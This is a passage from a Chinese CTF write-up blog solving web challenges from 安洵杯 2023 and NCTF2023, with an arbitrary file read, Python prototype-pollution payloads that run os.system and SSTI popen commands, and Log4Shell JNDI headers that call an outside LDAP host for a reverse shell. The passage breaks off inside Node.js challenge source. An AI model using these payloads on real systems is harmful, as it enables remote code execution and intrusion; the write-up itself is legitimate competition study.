class="hljs-attr">&quot;properties&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>            <span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>                <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;string&quot;</span>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span>            <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>                <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;string&quot;</span>            <span class="hljs-punctuation">&#125;</span>        <span class="hljs-punctuation">&#125;</span>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span>    <span class="hljs-attr">&quot;UserLogin&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>        <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;object&quot;</span><span class="hljs-punctuation">,</span>        <span class="hljs-attr">&quot;properties&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>            <span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>                <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;string&quot;</span>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span>            <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>                <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;string&quot;</span>            <span class="hljs-punctuation">&#125;</span>        <span class="hljs-punctuation">&#125;</span>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span></code></pre></div><p>所以传参的参数为<code>username</code>和<code>password</code></p><div class="code-wrapper"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">47.108</span>.<span class="hljs-number">206.43</span>:<span class="hljs-number">40476</span><span class="hljs-regexp">/api-base/</span>v0/register&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">47.108</span>.<span class="hljs-number">206.43</span>:<span class="hljs-number">40476</span><span class="hljs-regexp">/api-base/</span>v0/login&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>&#125;</code></pre></div><p><code>/api-base/v0/search</code>接口存在任意文件读取</p><p>接下来和CNSS招新赛一道题差不多</p><p>读进程</p><div class="code-wrapper"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">47.108</span>.<span class="hljs-number">206.43</span>:<span class="hljs-number">40476</span><span class="hljs-regexp">/api-base/</span>v0<span class="hljs-regexp">/search?file=/</span>proc<span class="hljs-regexp">/1/</span>cmdline&amp;type=text</code></pre></div><p>读源码</p><div class="code-wrapper"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">47.108</span>.<span class="hljs-number">206.43</span>:<span class="hljs-number">40476</span><span class="hljs-regexp">/api-base/</span>v0<span class="hljs-regexp">/search?file=/</span>app/run.sh&amp;type=texthttp:<span class="hljs-regexp">//</span><span class="hljs-number">47.108</span>.<span class="hljs-number">206.43</span>:<span class="hljs-number">40476</span><span class="hljs-regexp">/api-base/</span>v0<span class="hljs-regexp">/search?file=/</span>app/app.py&amp;type=texthttp:<span class="hljs-regexp">//</span><span class="hljs-number">47.108</span>.<span class="hljs-number">206.43</span>:<span class="hljs-number">40476</span><span class="hljs-regexp">/api-base/</span>v0<span class="hljs-regexp">/search?file=/</span>app/api.py&amp;type=text</code></pre></div><p>源码中存在</p><div class="code-wrapper"><pre><code class="hljs xquery">def <span class="hljs-keyword">update</span>(src, dst):    <span class="hljs-keyword">if</span> hasattr(dst, <span class="hljs-string">&#x27;__getitem__&#x27;</span>):        <span class="hljs-keyword">for</span><span class="hljs-built_in"> key</span> <span class="hljs-keyword">in</span> src:            <span class="hljs-keyword">if</span> isinstance(src<span class="hljs-built_in">[key</span>], dict):                 <span class="hljs-keyword">if</span><span class="hljs-built_in"> key</span> <span class="hljs-keyword">in</span> dst <span class="hljs-keyword">and</span> isinstance(src<span class="hljs-built_in">[key</span>], dict):                    <span class="hljs-keyword">update</span>(src<span class="hljs-built_in">[key</span>], dst<span class="hljs-built_in">[key</span>])                 else:                     dst<span class="hljs-built_in">[key</span>] = src<span class="hljs-built_in">[key</span>]            else:                dst<span class="hljs-built_in">[key</span>] = src<span class="hljs-built_in">[key</span>]    else:        <span class="hljs-keyword">for</span><span class="hljs-built_in"> key</span>, <span class="hljs-keyword">value</span> <span class="hljs-keyword">in</span> src.items() :            <span class="hljs-keyword">if</span> hasattr(dst<span class="hljs-built_in">,key</span>) <span class="hljs-keyword">and</span> isinstance(<span class="hljs-keyword">value</span>, dict):                <span class="hljs-keyword">update</span>(<span class="hljs-keyword">value</span>,getattr(dst,<span class="hljs-built_in"> key</span>))            else:                setattr(dst,<span class="hljs-built_in"> key</span>, <span class="hljs-keyword">value</span>)</code></pre></div><h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p>直接python原型链污染</p><p>官方wp给出一位师傅的wp</p><p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226234721487.png" alt="image-20231226234721487"></p><p>我一看就知道是<a href="https://tttang.com/archive/1876/#toc_jinja">Python原型链污染变体(prototype-pollution-in-python) - 跳跳糖 (tttang.com)</a>这一篇文章的</p><p>可惜了Boogipop大佬没试出来</p><p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226235550655.png" alt="image-20231226235550655"></p><p>直接一把梭哈</p><div class="code-wrapper"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;__init__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>    <span class="hljs-attr">&quot;__globals__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>        <span class="hljs-attr">&quot;__loader__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>            <span class="hljs-attr">&quot;__init__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>                <span class="hljs-attr">&quot;__globals__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>                    <span class="hljs-attr">&quot;sys&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>                        <span class="hljs-attr">&quot;modules&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>                            <span class="hljs-attr">&quot;jinja2&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>                                <span class="hljs-attr">&quot;runtime&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>                                    <span class="hljs-attr">&quot;exported&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span>                                        <span class="hljs-string">&quot;*;__import__(&#x27;os&#x27;).system(&#x27;ls /app &gt; /app/a&#x27;);#&quot;</span>                                    <span class="hljs-punctuation">]</span>                                <span class="hljs-punctuation">&#125;</span>                            <span class="hljs-punctuation">&#125;</span>                        <span class="hljs-punctuation">&#125;</span>                    <span class="hljs-punctuation">&#125;</span>                <span class="hljs-punctuation">&#125;</span>            <span class="hljs-punctuation">&#125;</span>        <span class="hljs-punctuation">&#125;</span>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span></code></pre></div><p>使用前面任意文件读取</p><div class="code-wrapper"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">47.108</span>.<span class="hljs-number">206.43</span>:<span class="hljs-number">40476</span><span class="hljs-regexp">/api-base/</span>v0<span class="hljs-regexp">/search?file=/</span>app/a&amp;type=text</code></pre></div><p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226235051453.png" alt="image-20231226235051453"></p><div class="code-wrapper"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">47.108</span>.<span class="hljs-number">206.43</span>:<span class="hljs-number">40526</span><span class="hljs-regexp">/api-base/</span>v0<span class="hljs-regexp">/search?file=/</span>app/EY6zl0isBvAWZFxZMvCCCTS3VRVMvoNi_FLAG&amp;type=text</code></pre></div><p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226235119574.png" alt="image-20231226235119574"></p><h3 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h3><p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231227135539670.png" alt="image-20231227135539670"></p><p>很明显的ssti漏洞，我们控制请求返回的结果为payload即可</p><p>但是如何控制呢，第一想法是上面的原型链污染写文件，那还不如直接非预期呢</p><p>这里很妙的使用了<code>http_proxy</code>这个环境变量</p><p><code>http_proxy</code> 环境变量主要是由底层 HTTP 请求库（如 <code>requests</code>）使用的，在<code>requests.get</code>时请求就会走代理</p><p>python原型链污染<code>http_proxy</code></p><div class="code-wrapper"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span>    <span class="hljs-attr">&quot;__init__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>    <span class="hljs-attr">&quot;__globals__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>        <span class="hljs-attr">&quot;os&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>            <span class="hljs-attr">&quot;environ&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>                <span class="hljs-attr">&quot;http_proxy&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;vps_ip:port&quot;</span>            <span class="hljs-punctuation">&#125;</span>        <span class="hljs-punctuation">&#125;</span>    <span class="hljs-punctuation">&#125;</span>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span></code></pre></div><p>然后使<code>type</code>为<code>text</code>即可，<code>file</code>随意</p><div class="code-wrapper"><pre><code class="hljs excel">/api-<span class="hljs-built_in">base</span>/<span class="hljs-symbol">v0</span>/<span class="hljs-built_in">search</span>?file=user&amp;<span class="hljs-built_in">type</span>=<span class="hljs-built_in">text</span></code></pre></div><p>开启监听，收到请求</p><p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231227140618936.png" alt="image-20231227140618936"></p><p>这里我们能控制请求的响应，所以根据响应包来对应写数据</p><p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231227140904083.png" alt="image-20231227140904083"></p><p>要手动ctrl+c退出</p><p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231227141137629.png" alt="image-20231227141137629"></p><p>说到<code>http_proxy</code>,前面写到<a href="https://zer0peach.github.io/2023/10/23/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/#%E8%A7%A3%E6%B3%95-HTTPoxy%E6%BC%8F%E6%B4%9E">已发生的比赛刷题 - Zer0peach can’t think</a>过类似的题</p><p>php 5.6.23的漏洞</p><p>在<code>CGI</code>(RFC 3875)的模式的时候， 会把请求中的Header， 加上<code>HTTP_</code> 前缀， 注册为环境变量</p><p>Header中发送一个<code>Proxy:xxxxxx</code>, 那么PHP就会把他注册为<code>HTTP_PROXY</code>环境变量</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-comment">//若返回内容中有success即可读取flag</span><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>])) &#123;    <span class="hljs-variable">$client</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Client</span>();    <span class="hljs-variable">$response</span> = <span class="hljs-variable">$client</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;http://127.0.0.1:5000/api/eligible&#x27;</span>);    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$response</span>-&gt;<span class="hljs-title function_ invoke__">getBody</span>();    <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-variable">$content</span>, <span class="hljs-literal">TRUE</span>);    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;success&#x27;</span>] === <span class="hljs-literal">true</span>) &#123;          <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;/readflag&#x27;</span>);    &#125;&#125;</code></pre></div><p>同样是访问本地，要控制返回结果</p><p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231227141849324.png" alt="image-20231227141849324"></p><p>然后同样做法即可</p><h3 id="又一种方法"><a href="#又一种方法" class="headerlink" title="又一种方法"></a>又一种方法</h3><p><code>pankas</code>师傅的方法</p><p>就像预期解说的要控制响应数据</p><p>那就污染Response，太强了，炸裂</p><div class="code-wrapper"><pre><code class="hljs json"><span class="hljs-attr">&quot;__init__&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>    <span class="hljs-attr">&quot;__globals__&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>        <span class="hljs-attr">&quot;requests&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>            <span class="hljs-attr">&quot;Response&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>                <span class="hljs-attr">&quot;text&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&#123;&#123;().__class__.__base__.__subclasses__()[154].__init__.__globals__[&#x27;popen&#x27;](&#x27;命令&#x27;).read()&#125;&#125;&quot;</span>            <span class="hljs-punctuation">&#125;</span>        <span class="hljs-punctuation">&#125;</span>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span></code></pre></div><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://dce.i-soon.net/#/group/detail/31">安洵DCE平台 (i-soon.net)</a></p><p>[第六届安洵杯网络安全挑战赛 Writeup - Boogiepop Doesn’t Laugh (boogipop.com)](<a href="https://boogipop.com/2023/12/24/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%AE%89%E6%B4%B5%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B">https://boogipop.com/2023/12/24/第六届安洵杯网络安全挑战赛</a> Writeup&#x2F;)</p><p><a href="https://mp.weixin.qq.com/s/ThIPnl2EflGXhIjSJAmZhw">https://mp.weixin.qq.com/s/ThIPnl2EflGXhIjSJAmZhw</a></p><p><a href="https://github.com/p4d0rn/Java_Zoo/blob/main/CTF/axb2023.md">Java_Zoo&#x2F;CTF&#x2F;axb2023.md at main · p4d0rn&#x2F;Java_Zoo (github.com)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>NCTF2023</title>
    <link href="/2023/12/24/NCTF2023/"/>
    <url>/2023/12/24/NCTF2023/</url>
    
    <content type="html"><![CDATA[<h1 id="NCTF2023"><a href="#NCTF2023" class="headerlink" title="NCTF2023"></a>NCTF2023</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>因为是南邮的比赛，那肯定是X1r0z大佬出题，所以十分期待，但是打安洵杯耗费了1天时间，不过即使不打安洵杯也做不出来。。。。</p><p>web 1&#x2F;6  因为是共享账号，其他题（其实就一题，排除签到和问卷）是其他人做的</p><p><img src="/../images/NCTF2023/image-20231226111317220.png" alt="image-20231226111317220"></p><h2 id="logging"><a href="#logging" class="headerlink" title="logging*"></a>logging*</h2><p>X1r0z本来打算作为签到题的，但一直没人做出来，就给了挺多hint</p><blockquote><p>X1r0z的WP</p><p>这个其实是之前研究 Log4j2 (CVE-2021-44228) 时想到的: SpringBoot 在默认配置下如何触发 Log4j2 JNDI RCE</p><p>默认配置是指代码仅仅使用了 Log4j2 的依赖, 而并没有设置其它任何东西 (例如自己写一个 Controller 然后将参数传入 logger.xxx 方法)</p><p>核心思路是<strong>如何构造一个畸形的 HTTP 数据包使得 SpringBoot 控制台报错</strong>, 简单 fuzz 一下就行</p><p>一个思路是 Accept 头, 如果 mine type 类型不对控制台会调用 logger 输出日志</p><div class="code-wrapper"><pre><code class="hljs Bash">logging-web-1  | 2023-12-24 09:15:41.220  WARN 7 --- [nio-8080-exec-2] .w.s.m.s.DefaultHandlerExceptionResolver : Resolved [org.springframework.web.HttpMediaTypeNotAcceptableException: Could not parse <span class="hljs-string">&#x27;Accept&#x27;</span> header [123]: Invalid mime <span class="hljs-built_in">type</span> <span class="hljs-string">&quot;123&quot;</span>: does not contain <span class="hljs-string">&#x27;/&#x27;</span>]</code></pre></div><p>另外还有 Host 头, 但是只能用一次, 第二次往后就不能再打印日志了</p><p>其实一些扫描器黑盒也能直接扫出来 (例如 nuclei)</p><div class="code-wrapper"><pre><code class="hljs Bash">[CVE-2021-44228] [http] [critical] http://124.71.184.68:8011/ [accept,25db884fff4b]</code></pre></div></blockquote><p>我是用Host请求头</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> / HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><span class="hljs-attribute">Host</span>: <span class="hljs-variable">$&#123;jndi:ldap://118.89.61.71:1389/Basic/ReverseShell/ip/port&#125;</span><span class="hljs-attribute">Cache</span>-Control: max-age=<span class="hljs-number">0</span><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">105</span>.<span class="hljs-number">0</span>.<span class="hljs-number">5195</span>.<span class="hljs-number">127</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,application/signed-exchange;v=b3;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><span class="hljs-attribute">Connection</span>: close</code></pre></div><p><img src="/../images/NCTF2023/image-20231224122835868.png" alt="image-20231224122835868"></p><p>使用Accept请求头</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> / HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><span class="hljs-attribute">Host</span>: <span class="hljs-number">124.71.184.68:8011</span><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Macintosh; Intel Mac OS X <span class="hljs-number">10</span>.<span class="hljs-number">15</span>; rv:<span class="hljs-number">121</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">121</span>.<span class="hljs-number">0</span><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><span class="hljs-variable">$&#123;jndi:ldap://ip:port/Basic/ReverseShell/ip/port&#125;</span><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,zh-TW;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,zh-HK;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">2</span><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<span class="hljs-attribute">Connection</span>: close<span class="hljs-attribute">Cookie</span>: aiovg_rand_seed=<span class="hljs-number">1362609461</span>Upgrade-Insecure-Requests: <span class="hljs-number">1</span></code></pre></div><h2 id="wait-what"><a href="#wait-what" class="headerlink" title="wait what"></a>wait what</h2><div class="code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<span class="hljs-keyword">const</span> child_process = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>)<span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>()app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">json</span>())<span class="hljs-keyword">const</span> port = <span class="hljs-number">80</span><span class="hljs-keyword">function</span> <span class="hljs-title function_">escapeRegExp</span>(<span class="hljs-params">string</span>) &#123;    <span class="hljs-keyword">return</span> string.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/[.*+?^$&#123;&#125;()|[\]\\]/g</span>, <span class="hljs-string">&#x27;\\$&amp;&#x27;</span>);&#125;<span class="hljs-keyword">let</span> users = &#123;    <span class="hljs-string">&quot;admin&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>,    <span class="hljs-string">&quot;user&quot;</span>: <span class="hljs-string">&quot;user&quot;</span>,    <span class="hljs-string">&quot;guest&quot;</span>: <span class="hljs-string">&quot;guest&quot;</span>,    <span class="hljs-string">&#x27;hacker&#x27;</span>:<span class="hljs-string">&#x27;hacker&#x27;</span>&#125;<span class="hljs-keyword">let</span> banned_users = [<span class="hljs-string">&#x27;hacker&#x27;</span>]<span class="hljs-comment">// 你不准getflag</span>banned_users.<span class="hljs-title function_">push</span>(<span class="hljs-string">&quot;admin&quot;</span>)<span class="hljs-keyword">let</span> banned_users_regex = <span class="hljs-literal">null</span>;<span class="hljs-keyword">function</span> <span class="hljs-title function_">build_banned_users_regex</span>(<span class="hljs-params"></span>) &#123;<span class="hljs-keyword">let</span> regex_string = <span class="hljs-string">&quot;&quot;</span>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> username <span class="hljs-keyword">of</span> banned_users) &#123;        regex_string += <span class="hljs-string">&quot;^&quot;</span> + escapeRegExp(username) + <span class="hljs-string">&quot;$&quot;</span> + <span class="hljs-string">&quot;|&quot;</span>    &#125;    regex_string = regex_string.<span class="hljs-title function_">substring</span>(<span class="hljs-number">0</span>, regex_string.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>)    banned_users_regex = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(regex_string, <span class="hljs-string">&quot;g&quot;</span>)&#125;<span class="hljs-comment">//鉴权中间件</span><span class="hljs-keyword">function</span> <span class="hljs-title function_">requireLogin</span>(<span class="hljs-params">req, res, next</span>) &#123;    <span class="hljs-keyword">let</span> username = req.<span class="hljs-property">body</span>.<span class="hljs-property">username</span>    <span class="hljs-keyword">let</span> password = req.<span class="hljs-property">body</span>.<span class="hljs-property">password</span>    <span class="hljs-keyword">if</span> (!username || !password) &#123;        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;用户名或密码不能为空&quot;</span>)        <span class="hljs-keyword">return</span>    &#125;    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> username !== <span class="hljs-string">&quot;string&quot;</span> || <span class="hljs-keyword">typeof</span> password !== <span class="hljs-string">&quot;string&quot;</span>) &#123;        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;用户名或密码不合法&quot;</span>)        <span class="hljs-keyword">return</span>    &#125;    <span class="hljs-comment">// 基于正则技术的封禁用户匹配系统的设计与实现</span>    <span class="hljs-keyword">let</span> test1 = banned_users_regex.<span class="hljs-title function_">test</span>(username)    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`使用正则<span class="hljs-subst">$&#123;banned_users_regex&#125;</span>匹配<span class="hljs-subst">$&#123;username&#125;</span>的结果为：<span class="hljs-subst">$&#123;test1&#125;</span>`</span>)    <span class="hljs-keyword">if</span> (test1) &#123;<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;第一个判断匹配到封禁用户：&quot;</span>,username)        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;用户&#x27;&quot;</span>+username + <span class="hljs-string">&quot;&#x27;被封禁，无法鉴权！&quot;</span>)        <span class="hljs-keyword">return</span>    &#125;    <span class="hljs-comment">// 基于in关键字的封禁用户匹配系统的设计与实现</span>    <span class="hljs-keyword">let</span> test2 = (username <span class="hljs-keyword">in</span> banned_users)    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`使用in关键字匹配<span class="hljs-subst">$&#123;username&#125;</span>的结果为：<span class="hljs-subst">$&#123;test2&#125;</span>`</span>)    <span class="hljs-keyword">if</span> (test2)&#123;        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;第二个判断匹配到封禁用户：&quot;</span>,username)        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;用户&#x27;&quot;</span>+username + <span class="hljs-string">&quot;&#x27;被封禁，无法鉴权！&quot;</span>)        <span class="hljs-keyword">return</span>    &#125;    <span class="hljs-keyword">if</span> (username <span class="hljs-keyword">in</span> users &amp;&amp; users[username] === password) &#123;        <span class="hljs-title function_">next</span>()        <span class="hljs-keyword">return</span>    &#125;    res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;用户名或密码错误，鉴权失败！&quot;</span>)&#125;<span class="hljs-keyword">function</span> <span class="hljs-title function_">registerUser</span>(<span class="hljs-params">username, password</span>) &#123;    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> username !== <span class="hljs-string">&quot;string&quot;</span> || username.<span class="hljs-property">length</span> &gt; <span class="hljs-number">20</span>) &#123;        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;用户名不合法&quot;</span>    &#125;    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> password !== <span class="hljs-string">&quot;string&quot;</span> || password.<span class="hljs-property">length</span> &gt; <span class="hljs-number">20</span>) &#123;        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;密码不合法&quot;</span>    &#125;    <span class="hljs-keyword">if</span> (username <span class="hljs-keyword">in</span> users) &#123;        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;用户已存在&quot;</span>    &#125;    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> existing_user <span class="hljs-keyword">in</span> users)&#123;        <span class="hljs-keyword">let</span> existing_user_password = users[existing_user]        <span class="hljs-keyword">if</span> (existing_user_password === password)&#123;            <span class="hljs-keyword">return</span> <span class="hljs-string">`您的密码已经被用户&#x27;<span class="hljs-subst">$&#123;existing_user&#125;</span>&#x27;使用了，请使用其它的密码`</span>        &#125;    &#125;    users[username] = password    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;注册成功&quot;</span>&#125;app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">static</span>(<span class="hljs-string">&#x27;public&#x27;</span>))<span class="hljs-comment">// 每次请求前，更新封禁用户正则信息</span>app.<span class="hljs-title function_">use</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">req, res, next</span>) &#123;    <span class="hljs-keyword">try</span> &#123;        <span class="hljs-title function_">build_banned_users_regex</span>()<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;封禁用户正则表达式（满足这个正则表达式的用户名为被封禁用户名）：&quot;</span>,banned_users_regex)    &#125; <span class="hljs-keyword">catch</span> (e) &#123;    &#125;    <span class="hljs-title function_">next</span>()&#125;)app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/api/register&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;    <span class="hljs-keyword">let</span> username = req.<span class="hljs-property">body</span>.<span class="hljs-property">username</span>    <span class="hljs-keyword">let</span> password = req.<span class="hljs-property">body</span>.<span class="hljs-property">password</span>    <span class="hljs-keyword">let</span> message = <span class="hljs-title function_">registerUser</span>(username, password)    res.<span class="hljs-title function_">send</span>(message)&#125;)app.<span class="hljs-title function_">post</span>(<span 